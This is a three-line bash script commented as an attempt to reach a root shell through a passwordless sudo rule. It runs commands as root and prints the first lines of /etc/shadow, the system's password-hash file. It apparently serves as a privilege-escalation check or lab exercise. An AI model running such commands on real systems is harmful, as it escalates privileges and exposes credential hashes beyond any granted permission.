#!/bin/bash
# Attempt sudo NOPASSWD to root shell
set -euo pipefail
sudo bash -c 'id && whoami && cat /etc/shadow | head -3'
